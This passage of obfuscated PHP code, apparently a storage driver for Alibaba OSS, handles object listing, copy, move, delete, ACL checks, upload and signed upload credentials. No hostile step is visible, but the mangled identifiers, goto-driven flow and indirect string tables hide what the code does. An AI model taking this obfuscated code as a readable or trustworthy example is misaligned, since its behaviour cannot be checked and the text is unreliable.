$eæ–¥ŒŠÄ‰->getPrefixList(); foreach ($D¸´é±‹— as $EËå‰Ü‹‘ˆ) { goto fÍ‹ÑôøÎµ; fÍ‹ÑôøÎµ: if ($EËå‰Ü‹‘ˆ->getKey() == $Cö¡­©Ü‹Ê) { continue; } $AÉ£Ğï™§ = $EËå‰Ü‹‘ˆ->getKey(); $Fè÷²ä·Ç = $EËå‰Ü‹‘ˆ->getSize(); goto a²ªëßˆŒÅ; e’¿çã½Ğò: if ($f‡èÅ ×„) { $this->cacheMethod($dÀÚ³îÄ÷[195], $AÉ£Ğï™§, $Dœ¤œ„ë¹‘); $this->cacheMethod($dÀÚ³îÄ÷[196], $AÉ£Ğï™§, array($dÀÚ³îÄ÷[77] => $Fè÷²ä·Ç, $dÀÚ³îÄ÷[1235] => $Fè÷²ä·Ç, $dÀÚ³îÄ÷[107] => strtotime($AîœÒËÓº«), $dÀÚ³îÄ÷[1236] => $AîœÒËÓº«)); } if ($Dœ¤œ„ë¹‘) { $B«‚«¯…ÄĞ[] = $AÉ£Ğï™§; continue; } $e³ô½·×Ô”[] = $fÜ©äÇÑ¸Æ; goto c¬ŠËñèß; a²ªëßˆŒÅ: $AîœÒËÓº« = $EËå‰Ü‹‘ˆ->getLastModified(); $fÜ©äÇÑ¸Æ = $E¾Üßßİİ§ ? array($dÀÚ³îÄ÷[28] => $AÉ£Ğï™§, $dÀÚ³îÄ÷[77] => $Fè÷²ä·Ç, $dÀÚ³îÄ÷[193] => strtotime($AîœÒËÓº«)) : $AÉ£Ğï™§; $Dœ¤œ„ë¹‘ = $Fè÷²ä·Ç == 0 && substr($AÉ£Ğï™§, strlen($AÉ£Ğï™§) - 1, 1) == $dÀÚ³îÄ÷[8] ? !0 : !1; goto e’¿çã½Ğò; c¬ŠËñèß: } foreach ($DÂ¶°‡è¹ as $cˆ„­†­ñ¿) { $B«‚«¯…ÄĞ[] = $cˆ„­†­ñ¿->getPrefix(); if ($f‡èÅ ×„) { $this->cacheMethod($dÀÚ³îÄ÷[195], $AÉ£Ğï™§, !0); } } if ($F…ƒêìÀòÃ === $dÀÚ³îÄ÷[33]) { break; } } if ($f‡èÅ ×„) { $this->cacheMethod($dÀÚ³îÄ÷[195], $C†· §” ¨, !0); } goto Eé‹ÛÇ×ÁÀ; a­ÆåÌÃ½´: } public function copyFile($a ¸½£šÁ, $b©êŒïêÄÛ) { $d‹†éå„‘Ï = $this->size($a ¸½£šÁ); if ($d‹†éå„‘Ï < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $a ¸½£šÁ, $this->bucket, $this->pathEncode($b©êŒïêÄÛ)); } catch (OSS\Core\OssException $e¬È£„´„) { return !1; } return $this->getPathOuter($b©êŒïêÄÛ); } $BÆøÛĞõ¼ç = $this->multiCopyObject($a ¸½£šÁ, $b©êŒïêÄÛ, $d‹†éå„‘Ï); return $BÆøÛĞõ¼ç ? $this->getPathOuter($b©êŒïêÄÛ) : !1; } private function multiCopyObject($B°Îíèà, $Aµïù­Ê…Š, $c¸êÉ¦«æ§) { $F…èÍñ‡Óò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; try { goto D×°‹ï«œ¤; Dè¾Üò†: $cÆÏÃÌˆÃ = array(); foreach ($c›‚¼ÊÓæÍ as $AÉ°¤¢Ì¬ => $fÉ…¸Ä†ª) { $cÆÏÃÌˆÃ[] = array($F…èÍñ‡Óò[1241] => $AÉ°¤¢Ì¬ + 1, $F…èÍñ‡Óò[1242] => $fÉ…¸Ä†ª); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Aµïù­Ê…Š), $Aâµ‡›¬Çí, $cÆÏÃÌˆÃ); goto fµÜĞ¤Ê; D×°‹ï«œ¤: $f¡¯¯î¢ÂÏ = array(); if ($D¿²ìÂò°½ = $this->hashMd5($B°Îíèà)) { $f¡¯¯î¢ÂÏ = array(OSS\OssClient::OSS_HEADERS => array($F…èÍñ‡Óò[1237] => $D¿²ìÂò°½)); } $Aâµ‡›¬Çí = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Aµïù­Ê…Š), $f¡¯¯î¢ÂÏ); goto Cè¸ŠÌ¦Øí; C±™ò­¼î: $eµÅ°’º¸ß = 1024 * 1024 * 10; $a¯ÔíˆğÏ„ = $this->client->generateMultiuploadParts($c¸êÉ¦«æ§, $eµÅ°’º¸ß); foreach ($a¯ÔíˆğÏ„ as $AÉ°¤¢Ì¬ => $A•‹«‘ØÑ) { $FäºƒÄŞ‹É = $Bá¦Æ‘ÓÅ + (int) $A•‹«‘ØÑ[$F…èÍñ‡Óò[1238]]; $EÒÉ† ©‰ = (int) $A•‹«‘ØÑ[$F…èÍñ‡Óò[331]] + $FäºƒÄŞ‹É - 1; $dñ“ßÉ‡Ï = array($F…èÍñ‡Óò[1239] => $FäºƒÄŞ‹É, $F…èÍñ‡Óò[1240] => $EÒÉ† ©‰); $c›‚¼ÊÓæÍ[] = $this->client->uploadPartCopy($this->bucket, $B°Îíèà, $this->bucket, $this->pathEncode($Aµïù­Ê…Š), $cÂ’©™‘Üñ, $Aâµ‡›¬Çí, $dñ“ßÉ‡Ï); $cÂ’©™‘Üñ = $cÂ’©™‘Üñ + 1; } goto Dè¾Üò†; Cè¸ŠÌ¦Øí: $cÂ’©™‘Üñ = 1; $Bá¦Æ‘ÓÅ = 0; $c›‚¼ÊÓæÍ = array(); goto C±™ò­¼î; fµÜĞ¤Ê: } catch (OSS\Core\OssException $aµ†İÁËËÔ) { return !1; } return !0; } public function moveFile($b®Æ¦Çšµ, $a¢º ®Ïæˆ) { if ($this->copyFile($b®Æ¦Çšµ, $a¢º ®Ïæˆ)) { $this->remove($b®Æ¦Çšµ); return $this->getPathOuter($a¢º ®Ïæˆ); } return !1; } public function delFile($BÊÒÄ¢°çÒ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($BÊÒÄ¢°çÒ)); } catch (OSS\Core\OssException $Eš¯ãªÃˆ™) { return !1; } return !0; } public function delFolder($B»Ô‡ºÈŠ¾) { goto dßÍÖ¤ÒŸ¦; AÇÚ÷•½…¥: $F”Ûóß‹Ÿ¢ = $this->fileList($B»Ô‡ºÈŠ¾); $this->listItemCache = !0; $fÇØíÉË’¾ = trim($B»Ô‡ºÈŠ¾, $Cˆô‘™Ş[8]) . $Cˆô‘™Ş[8]; goto dÜ×Å×—ë; dßÍÖ¤ÒŸ¦: $Cˆô‘™Ş =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->exist($B»Ô‡ºÈŠ¾)) { return !0; } $this->listItemCache = !1; goto AÇÚ÷•½…¥; dÜ×Å×—ë: if (!empty($B»Ô‡ºÈŠ¾) && !in_array($fÇØíÉË’¾, $F”Ûóß‹Ÿ¢[$Cˆô‘™Ş[74]])) { $F”Ûóß‹Ÿ¢[$Cˆô‘™Ş[74]][] = $fÇØíÉË’¾; } $dïÄÉš¾Éñ = $this->delByBatch($F”Ûóß‹Ÿ¢[$Cˆô‘™Ş[73]]); if (!$dïÄÉš¾Éñ) { return !1; } goto cù¼šÙ‹áÜ; cù¼šÙ‹áÜ: return $this->delByBatch($F”Ûóß‹Ÿ¢[$Cˆô‘™Ş[74]]); goto f•Ä¼ì™Âã; f•Ä¼ì™Âã: } private function delByBatch($DùÊå ‡„) { foreach (array_chunk($DùÊå ‡„, 1000) as $CèÛÑá†è†) { try { $this->client->deleteObjects($this->bucket, $CèÛÑá†è†); } catch (OSS\Core\OssException $BÙÍâ‡ÓÊ) { return !1; } } return !0; } public function rename($C„¹ëøçİ, $B“±Ø†öĞ) { return $this->renameObject($C„¹ëøçİ, $B“±Ø†öĞ); } private function fileInfo($díÈ±¬èº, $D…ÜÓ•¯ôì = false, $dÓ±°µ¡÷¦ = array()) { goto E¯®´éÂ¶¢; A÷¼ñÄÊ‡: $D®ÒƒÄİØ[$A‘Êé§Óœ‚[190]] = $D®ÒƒÄİØ[$A‘Êé§Óœ‚[107]] = 0; $D®ÒƒÄİØ[$A‘Êé§Óœ‚[191]] = $D®ÒƒÄİØ[$A‘Êé§Óœ‚[192]] = !0; if (empty($dÓ±°µ¡÷¦)) { $AÜ…ŒÑ…² = $this->objectMeta($díÈ±¬èº); if (!$AÜ…ŒÑ…²) { return $D®ÒƒÄİØ; } $dÓ±°µ¡÷¦ = array($A‘Êé§Óœ‚[107] => strtotime($AÜ…ŒÑ…²[$A‘Êé§Óœ‚[1236]]), $A‘Êé§Óœ‚[77] => $AÜ…ŒÑ…²[$A‘Êé§Óœ‚[1235]] + 0); } goto eİÇõìÖä; c˜­„·²Ø˜: return $D®ÒƒÄİØ; goto båìƒÂØ; eİÇõìÖä: if (isset($dÓ±°µ¡÷¦[$A‘Êé§Óœ‚[77]])) { $D®ÒƒÄİØ[$A‘Êé§Óœ‚[77]] = $dÓ±°µ¡÷¦[$A‘Êé§Óœ‚[77]]; } if (isset($dÓ±°µ¡÷¦[$A‘Êé§Óœ‚[107]])) { $D®ÒƒÄİØ[$A‘Êé§Óœ‚[107]] = $dÓ±°µ¡÷¦[$A‘Êé§Óœ‚[107]]; } if (isset($dÓ±°µ¡÷¦[$A‘Êé§Óœ‚[193]]) && !trim($D®ÒƒÄİØ[$A‘Êé§Óœ‚[107]])) { $D®ÒƒÄİØ[$A‘Êé§Óœ‚[107]] = $dÓ±°µ¡÷¦[$A‘Êé§Óœ‚[193]]; } goto c˜­„·²Ø˜; E¯®´éÂ¶¢: $A‘Êé§Óœ‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $D®ÒƒÄİØ = array($A‘Êé§Óœ‚[28] => $this->pathThis($díÈ±¬èº), $A‘Êé§Óœ‚[75] => $this->getPathOuter($díÈ±¬èº), $A‘Êé§Óœ‚[29] => $A‘Êé§Óœ‚[171], $A‘Êé§Óœ‚[77] => isset($dÓ±°µ¡÷¦[$A‘Êé§Óœ‚[77]]) ? $dÓ±°µ¡÷¦[$A‘Êé§Óœ‚[77]] : 0, $A‘Êé§Óœ‚[165] => $this->ext($díÈ±¬èº)); if ($D…ÜÓ•¯ôì) { return $D®ÒƒÄİØ; } goto A÷¼ñÄÊ‡; båìƒÂØ: } private function folderInfo($dŠÁÖË–Ï², $Bä­˜ˆõ¢ = false, $AŠá·§ÂŠ = array()) { goto bàöÌÑ©‹È; c÷“Êëƒ¾æ: if (isset($AŠá·§ÂŠ[$dï¶Û»Ñ¹Ü[107]])) { $eåïĞ‹ßëä[$dï¶Û»Ñ¹Ü[107]] = $AŠá·§ÂŠ[$dï¶Û»Ñ¹Ü[107]]; } if (isset($AŠá·§ÂŠ[$dï¶Û»Ñ¹Ü[190]])) { $eåïĞ‹ßëä[$dï¶Û»Ñ¹Ü[190]] = $AŠá·§ÂŠ[$dï¶Û»Ñ¹Ü[190]]; } return $eåïĞ‹ßëä; goto FÛğö„Í‰ä; bàöÌÑ©‹È: $dï¶Û»Ñ¹Ü =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eåïĞ‹ßëä = array($dï¶Û»Ñ¹Ü[28] => $this->pathThis($dŠÁÖË–Ï²), $dï¶Û»Ñ¹Ü[75] => $this->getPathOuter($dï¶Û»Ñ¹Ü[8] . $dŠÁÖË–Ï²), $dï¶Û»Ñ¹Ü[29] => $dï¶Û»Ñ¹Ü[76]); if ($Bä­˜ˆõ¢) { return $eåïĞ‹ßëä; } goto E™êÂ®òÏ; E™êÂ®òÏ: $eåïĞ‹ßëä[$dï¶Û»Ñ¹Ü[190]] = $eåïĞ‹ßëä[$dï¶Û»Ñ¹Ü[107]] = 0; $eåïĞ‹ßëä[$dï¶Û»Ñ¹Ü[191]] = $eåïĞ‹ßëä[$dï¶Û»Ñ¹Ü[192]] = !0; if (empty($AŠá·§ÂŠ)) { $dŠÁÖË–Ï² = rtrim($dŠÁÖË–Ï², $dï¶Û»Ñ¹Ü[8]) . $dï¶Û»Ñ¹Ü[8]; $D„å¢ß– = $this->objectMeta($dŠÁÖË–Ï²); if (!$D„å¢ß–) { return $eåïĞ‹ßëä; } $AŠá·§ÂŠ = array($dï¶Û»Ñ¹Ü[190] => $D„å¢ß–[$dï¶Û»Ñ¹Ü[1243]][$dï¶Û»Ñ¹Ü[1244]], $dï¶Û»Ñ¹Ü[107] => strtotime($D„å¢ß–[$dï¶Û»Ñ¹Ü[1236]])); } goto c÷“Êëƒ¾æ; FÛğö„Í‰ä: } public function listPath($BòøîßòÜ, $fì Ù‡ëÇŒ = false) { $Bò§ñª½Ù =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e²™‚Š¦¡ = $this->fileList($BòøîßòÜ, $Bò§ñª½Ù[8], !0); foreach ($e²™‚Š¦¡[$Bò§ñª½Ù[74]] as $e¡ËàÌ†ëÊ => $C£†è¥©Ø¸) { $e²™‚Š¦¡[$Bò§ñª½Ù[74]][$e¡ËàÌ†ëÊ] = $this->folderInfo($C£†è¥©Ø¸, $fì Ù‡ëÇŒ, $C£†è¥©Ø¸); } foreach ($e²™‚Š¦¡[$Bò§ñª½Ù[73]] as $e¡ËàÌ†ëÊ => $C£†è¥©Ø¸) { $e²™‚Š¦¡[$Bò§ñª½Ù[73]][$e¡ËàÌ†ëÊ] = $this->fileInfo($C£†è¥©Ø¸[$Bò§ñª½Ù[28]], $fì Ù‡ëÇŒ, $C£†è¥©Ø¸); } return $e²™‚Š¦¡; } public function has($eÀãÅ‹âĞ, $fâ®¾µİÃì = false, $Ağ„·ñ¶©‘ = true) { goto eÂĞ–õ¾º†; BªÉÂ¬åƒÎ: $CÒò™ƒ½ = $D©Ó·òã·”[33]; $C˜Û‡…´ª› = 500; $cõóÒßèŸ = $CïêëÃğ™ø = 0; goto C¢‹ƒ¼×í¾; eÂĞ–õ¾º†: $D©Ó·òã·” =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÀãÅ‹âĞ = trim($eÀãÅ‹âĞ, $D©Ó·òã·”[8]); $CäÉØù·‹– = empty($eÀãÅ‹âĞ) ? $D©Ó·òã·”[33] : $eÀãÅ‹âĞ . $D©Ó·òã·”[8]; goto BªÉÂ¬åƒÎ; C¢‹ƒ¼×í¾: while (!0) { check_abort(); $DéĞÅ„Ú×Ê = array($D©Ó·òã·”[1231] => $D©Ó·òã·”[8], $D©Ó·òã·”[1232] => $CäÉØù·‹–, $D©Ó·òã·”[1233] => $C˜Û‡…´ª›, $D©Ó·òã·”[1234] => $CÒò™ƒ½); try { $Dßİˆ„Å¯ñ = $this->client->listObjects($this->bucket, $DéĞÅ„Ú×Ê); } catch (OSS\Core\OssException $d¯À‡åå…†) { break; } $CÒò™ƒ½ = $Dßİˆ„Å¯ñ->getNextMarker(); $aåÜ…ƒ°±ã = $Dßİˆ„Å¯ñ->getObjectList(); $BêíÀ®ø§Ó = $Dßİˆ„Å¯ñ->getPrefixList(); if ($fâ®¾µİÃì) { if (count($aåÜ…ƒ°±ã) > 1 || count($aåÜ…ƒ°±ã) == 1 && $aåÜ…ƒ°±ã[0]->getKey() != $CäÉØù·‹–) { $cõóÒßèŸ += count($aåÜ…ƒ°±ã) - 1; } if (!empty($BêíÀ®ø§Ó)) { $CïêëÃğ™ø += count($BêíÀ®ø§Ó); } if ($CÒò™ƒ½ === $D©Ó·òã·”[33]) { break; } continue; } if ($Ağ„·ñ¶©‘) { if (!empty($aåÜ…ƒ°±ã)) { if (count($aåÜ…ƒ°±ã) > 1 || $aåÜ…ƒ°±ã[0]->getKey() != $CäÉØù·‹–) { return !0; } } } else { if (!empty($BêíÀ®ø§Ó)) { return !0; } } if ($CÒò™ƒ½ === $D©Ó·òã·”[33]) { break; } } if ($fâ®¾µİÃì) { return array($D©Ó·òã·”[199] => $cõóÒßèŸ, $D©Ó·òã·”[200] => $CïêëÃğ™ø); } return !1; goto bñˆ¢­¨ë”; bñˆ¢­¨ë”: } public function listAll($Aİ²¤Ç¡„ô) { $b–•†Ò®Î =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DŒŞ‹¬¤åº = $this->fileList($Aİ²¤Ç¡„ô, $b–•†Ò®Î[33], !0); $a®¼¢¿ò»Ó = array(); foreach ($DŒŞ‹¬¤åº[$b–•†Ò®Î[73]] as $bçŠ¯à†İ‘) { $a®¼¢¿ò»Ó[$bçŠ¯à†İ‘[$b–•†Ò®Î[28]]] = $bçŠ¯à†İ‘[$b–•†Ò®Î[77]]; } foreach ($DŒŞ‹¬¤åº[$b–•†Ò®Î[74]] as $bçŠ¯à†İ‘) { if (is_string($bçŠ¯à†İ‘)) { $a®¼¢¿ò»Ó[$bçŠ¯à†İ‘] = 0; } } return $this->listAllFiles($Aİ²¤Ç¡„ô, array_keys($a®¼¢¿ò»Ó), $a®¼¢¿ò»Ó); } public function canRead($CÏ«¹æÇÁ) { $b±…£ÜÍ² =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $e•¹ õ¢ƒå = $this->pathAcl($CÏ«¹æÇÁ); return $e•¹ õ¢ƒå == $b±…£ÜÍ²[1245] || $e•¹ õ¢ƒå == $b±…£ÜÍ²[508] ? !0 : !1; } public function canWrite($DØ˜  ‹„) { $F¶Âì²¢íà = $this->pathAcl($DØ˜  ‹„); return $F¶Âì²¢íà == $_SERVER[ÈİÅ¿ÈÈ¥×][508] ? !0 : !1; } public function pathAcl($aíƒÂáÏÓ«) { goto CÔ³ªÍÂ; dš¸Ä”¾Ú: $A°Ö—¤»Š = $CÍ¹î§ø‘ == $cÕ’ÜªÊë²[34] ? $this->bucketAcl : $CÍ¹î§ø‘; if ($A°Ö—¤»Š == $cÕ’ÜªÊë²[1246]) { return $cÕ’ÜªÊë²[1245]; } if ($A°Ö—¤»Š == $cÕ’ÜªÊë²[1247]) { return $cÕ’ÜªÊë²[508]; } goto cèË•ßá¶ ; cèË•ßá¶ : return $A°Ö—¤»Š; goto cé‘ºÑ…Š¿; CÔ³ªÍÂ: $cÕ’ÜªÊë² =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $CÍ¹î§ø‘ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($aíƒÂáÏÓ«)); } catch (OSS\Core\OssException $aÈÅŞò‹ßæ) { return !1; } goto dš¸Ä”¾Ú; cé‘ºÑ…Š¿: } private function chmodPath($D–Ô¸“ñÖª, $C–ô…­Âï = '') { $B°öºáÁ±‡ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $AÈ˜ÉÅõùâ = empty($C–ô…­Âï) ? $B°öºáÁ±‡[1247] : $C–ô…­Âï; $d–õ‹Ù“ = array($B°öºáÁ±‡[34], $B°öºáÁ±‡[189], $B°öºáÁ±‡[1246], $B°öºáÁ±‡[1247]); if (!in_array($AÈ˜ÉÅõùâ, $d–õ‹Ù“)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($D–Ô¸“ñÖª), $AÈ˜ÉÅõùâ); } catch (OSS\Core\OssException $F‚ñ¬ã«ÖÉ) { return !1; } return !0; } public function getContent($e©õí¶éšØ) { return $this->fileSubstr($e©õí¶éšØ, -1); } public function setContent($eæÊ Ïñ·£, $dÀâœºô¼ = '') { $c½½”õñ§Ò =& $_SERVER[ÈİÅ¿ÈÈ¥×]; try { $E¦á“æ‚ÛÅ = $this->trafficLimit($c½½”õñ§Ò[1248]); $D¥İØ÷¬½ = $this->client->putObject($this->bucket, $this->pathEncode($eæÊ Ïñ·£), $dÀâœºô¼, $E¦á“æ‚ÛÅ); } catch (OSS\Core\OssException $FÈ—æÃØÕñ) { return !1; } $d³á÷Ã¨ä£ = array($c½½”õñ§Ò[1237] => trim($D¥İØ÷¬½[$c½½”õñ§Ò[1249]], $c½½”õñ§Ò[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eæÊ Ïñ·£))); $this->updateObjMeta($eæÊ Ïñ·£, $d³á÷Ã¨ä£); return isset($D¥İØ÷¬½[$c½½”õñ§Ò[1250]][$c½½”õñ§Ò[1196]]) ? !0 : !1; } private function updateObjMeta($cÚ’£‹¹, $bƒŸ¯¸Á•) { $cÚ’£‹¹ = $this->pathEncode($cÚ’£‹¹); try { $aãëÚ¥œÚÑ = array(OSS\OssClient::OSS_HEADERS => $bƒŸ¯¸Á•); $this->client->copyObject($this->bucket, $cÚ’£‹¹, $this->bucket, $cÚ’£‹¹, $aãëÚ¥œÚÑ); } catch (OSS\Core\OssException $AèÈµÛ‚é±) { return !1; } return !0; } public function upload($D¸ÈŠæâ¨•, $AéŒğ§Õ¹ó, $FÁø·êÌö = false, $F–—Ñ²ôÀ = REPEAT_REPLACE) { $d¨Ã¯íÛÃ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fÀ®êÓ×Óò = trim($D¸ÈŠæâ¨•, $d¨Ã¯íÛÃ[8]); $FÑÏó½Š¿× = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($d¨Ã¯íÛÃ[1237] => @md5_file($AéŒğ§Õ¹ó)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($D¸ÈŠæâ¨•))); $FÑÏó½Š¿× = $this->trafficLimit($d¨Ã¯íÛÃ[1248], $FÑÏó½Š¿×); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($fÀ®êÓ×Óò), $AéŒğ§Õ¹ó, $FÑÏó½Š¿×); } catch (OSS\Core\OssException $D“Ó¤ø öã) { return !1; } return $this->getPathOuter($D¸ÈŠæâ¨•); } public function getHost() { $BÇ™ï¨®®ç =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fÙâßò‡ùÎ = explode($BÇ™ï¨®®ç[175], parent::getHost()); return $fÙâßò‡ùÎ[0] . $BÇ™ï¨®®ç[175] . $this->bucket . $BÇ™ï¨®®ç[91] . $fÙâßò‡ùÎ[1]; } public function uploadFormData($e¶»øÅºÙÆ, $C¿êòÄ½î  = 3600) { goto Cë½¹¶—†; EÁ«›İµ­Ÿ: $có…µÊ‘±µ = $this->pathFather($e¶»øÅºÙÆ); $cöŸïã¤Ó¶ = array($C“ĞŸó‰Ç[1152] => $AÏìŒ•·Ê”, $C“ĞŸó‰Ç[1153] => array(array($C“ĞŸó‰Ç[1253], 0, $BïŠ¬ªšÄ), array($C“ĞŸó‰Ç[1156], $C“ĞŸó‰Ç[1157], $có…µÊ‘±µ))); $D„º§â˜÷ = base64_encode(json_encode($cöŸïã¤Ó¶)); goto BÔ°ŒÁ¾‹†; e£ÑİğÂÃ¢: $FÙŞËİ¡æ = date($C“ĞŸó‰Ç[1251], time() + $d²“ÉËÏÙ‚); $fƒ‘âø—™İ = new DateTime($FÙŞËİ¡æ); $AÏìŒ•·Ê” = $fƒ‘âø—™İ->format(DateTime::ISO8601); goto aóªî‚æ´à; aóªî‚æ´à: $BÁÆï¸ßÆ = strpos($AÏìŒ•·Ê”, $C“ĞŸó‰Ç[290]); $AÏìŒ•·Ê” = substr($AÏìŒ•·Ê”, 0, $BÁÆï¸ßÆ) . $C“ĞŸó‰Ç[1252]; $BïŠ¬ªšÄ = 1048576000 * 5; goto EÁ«›İµ­Ÿ; E¹¸òîãòÇ: return $bß—‘–Æ¦Ü; goto eÂÍÁ¥–öÒ; BÔ°ŒÁ¾‹†: $aíÆñâ‘¶ = base64_encode(hash_hmac($C“ĞŸó‰Ç[226], $D„º§â˜÷, $this->secret, !0)); $bß—‘–Æ¦Ü = array($C“ĞŸó‰Ç[1162] => $D„º§â˜÷, $C“ĞŸó‰Ç[1254] => $this->accessKey, $C“ĞŸó‰Ç[1158] => $C“ĞŸó‰Ç[1150], $C“ĞŸó‰Ç[1255] => $aíÆñâ‘¶, $C“ĞŸó‰Ç[173] => $f˜ŞÕ½Ã¨); $bß—‘–Æ¦Ü = $this->trafficLimit($C“ĞŸó‰Ç[1248], $bß—‘–Æ¦Ü); goto E¹¸òîãòÇ; Cë½¹¶—†: $C“ĞŸó‰Ç =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!($f˜ŞÕ½Ã¨ = $this->getHost())) { return !1; } $d²“ÉËÏÙ‚ = $C¿êòÄ½î ; goto e£ÑİğÂÃ¢; eÂÍÁ¥–öÒ: } public function multiUploadFormData($dáÛˆ£Í¨, $C×¯Ã¬×¤Ú = 3600) { $d”øÖñ­Ä =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!($aÜ“Î·—°Â = $this->getHost())) { return !1; } $Fô¹¸”Ş© = $this->trafficLimit($d”øÖñ­Ä[1248]); $dâ“íƒ©® = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($dáÛˆ£Í¨), $Fô¹¸”Ş©); return array($d”øÖñ­Ä[217] => $dâ“íƒ©®, $d”øÖñ­Ä[173] => $aÜ“Î·—°Â . $d”øÖñ­Ä[8] . $this->pathEncode($dáÛˆ£Í¨), $d”øÖñ­Ä[218] => gmdate($d”øÖñ­Ä[1256]), $d”øÖñ­Ä[89] => $dáÛˆ£Í¨); } public function multiUploadAuthData($c»ììºí‰, $BÉ¸êæµÆ = array()) { goto DŒó‚Š¾; FÀ•¸¸ø´µ: if (!empty($BÉ¸êæµÆ[$f„Ê‚‘ÑË[1258]])) { $eà˜´âìˆÏ = array_merge(array($a‰Ì±ŒòÃŒ[4]), $BÉ¸êæµÆ[$f„Ê‚‘ÑË[1258]]); sort($eà˜´âìˆÏ); $a‰Ì±ŒòÃŒ[4] = implode($f„Ê‚‘ÑË[225], $eà˜´âìˆÏ); } $F«Œ¥œï = implode($f„Ê‚‘ÑË[225], $a‰Ì±ŒòÃŒ); $DÔíŒ¸æ‡ = base64_encode(hash_hmac($f„Ê‚‘ÑË[226], $F«Œ¥œï, $this->secret, !0)); goto E¯ïâñ¨è; DŒó‚Š¾: $f„Ê‚‘ÑË =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $aŒ¿Û±¶¬¬ = isset($BÉ¸êæµÆ[$f„Ê‚‘ÑË[218]]) ? $BÉ¸êæµÆ[$f„Ê‚‘ÑË[218]] : gmdate($f„Ê‚‘ÑË[1256]); $c¢µ¬ ·¦Ï = isset($BÉ¸êæµÆ[$f„Ê‚‘ÑË[165]]) ? $BÉ¸êæµÆ[$f„Ê‚‘ÑË[165]] : $f„Ê‚‘ÑË[33]; goto eœËÔç•ë›; E¯ïâñ¨è: $cˆÅ…°Á® = $f„Ê‚‘ÑË[1221] . $this->accessKey . $f„Ê‚‘ÑË[4] . $DÔíŒ¸æ‡; if (strpos($c¢µ¬ ·¦Ï, $f„Ê‚‘ÑË[221]) === 0) { $cˆÅ…°Á® = array($f„Ê‚‘ÑË[228] => $cˆÅ…°Á®, $f„Ê‚‘ÑË[218] => $aŒ¿Û±¶¬¬); if ($bÓĞ”ùêÚ) { $cˆÅ…°Á® = array_merge($cˆÅ…°Á®, $bÓĞ”ùêÚ); } } return $cˆÅ…°Á®; goto FÏÜÒòø£; fºéââ›¬¯: $a‰Ì±ŒòÃŒ = array($f„Ê‚‘ÑË[220], $f„Ê‚‘ÑË[33], $f„Ê‚‘ÑË[116], $aŒ¿Û±¶¬¬, "\170\55\157\x73\x73\x2d\144\x61\x74\145\x3a{$aŒ¿Û±¶¬¬}", $f„Ê‚‘ÑË[8] . $this->bucket . $f„Ê‚‘ÑË[8] . $dĞÂ‹‹ˆ¯à . $c¢µ¬ ·¦Ï); if (strpos($c¢µ¬ ·¦Ï, $f„Ê‚‘ÑË[221]) === 0) { $a‰Ì±ŒòÃŒ[0] = $f„Ê‚‘ÑË[222]; if ($bÓĞ”ùêÚ = $this->trafficLimit($f„Ê‚‘ÑË[1248])) { $dĞÂ‹‹ˆ¯à = $f„Ê‚‘ÑË[1257]; array_splice($a‰Ì±ŒòÃŒ, 5, 0, $dĞÂ‹‹ˆ¯à . $f„Ê‚‘ÑË[4] . $bÓĞ”ùêÚ[$dĞÂ‹‹ˆ¯à]); } } if (isset($BÉ¸êæµÆ[$f„Ê‚‘ÑË[223]]) && $BÉ¸êæµÆ[$f„Ê‚‘ÑË[223]] == $f„Ê‚‘ÑË[224]) { $a‰Ì±ŒòÃŒ[0] = $f„Ê‚‘ÑË[224]; } goto FÀ•¸¸ø´µ; eœËÔç•ë›: $dĞÂ‹‹ˆ¯à = $c»ììºí‰; if (isset($BÉ¸êæµÆ[$f„Ê‚‘ÑË[89]])) { $dĞÂ‹‹ˆ¯à = $BÉ¸êæµÆ[$f„Ê‚‘ÑË[89]]; unset($BÉ¸êæµÆ[$f„Ê‚‘ÑË[89]]); } if (isset($BÉ¸êæµÆ[$f„Ê‚‘ÑË[219]])) { $BÉ¸êæµÆ[$f„Ê‚‘ÑË[218]] = $aŒ¿Û±¶¬¬; return $this->listUploadParts($dĞÂ‹‹ˆ¯à, $BÉ¸êæµÆ); } goto fºéââ›¬¯; FÏÜÒòø£: } public function listUploadParts($c©½‚ˆ›åÚ, $cÏ¡ğĞÚÚ) { goto B»«­²Ì…œ; eÖ¯™‚ÜŸ: return array($D¹…ÍåÕ[228] => $F‘«îË¶½, $D¹…ÍåÕ[218] => $cÏ¡ğĞÚÚ[$D¹…ÍåÕ[218]], $D¹…ÍåÕ[230] => $A¢µé¸«Æ‡); goto C¯ä¿÷’Ë; fÅïÀÉÌİ : unset($cÏ¡ğĞÚÚ[$D¹…ÍåÕ[219]], $cÏ¡ğĞÚÚ[$D¹…ÍåÕ[223]]); $F‘«îË¶½ = $this->multiUploadAuthData($c©½‚ˆ›åÚ, $cÏ¡ğĞÚÚ); if (empty($F‘«îË¶½)) { return !1; } goto eÖ¯™‚ÜŸ; B»«­²Ì…œ: $D¹…ÍåÕ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $d‰É‡¶™İŸ = 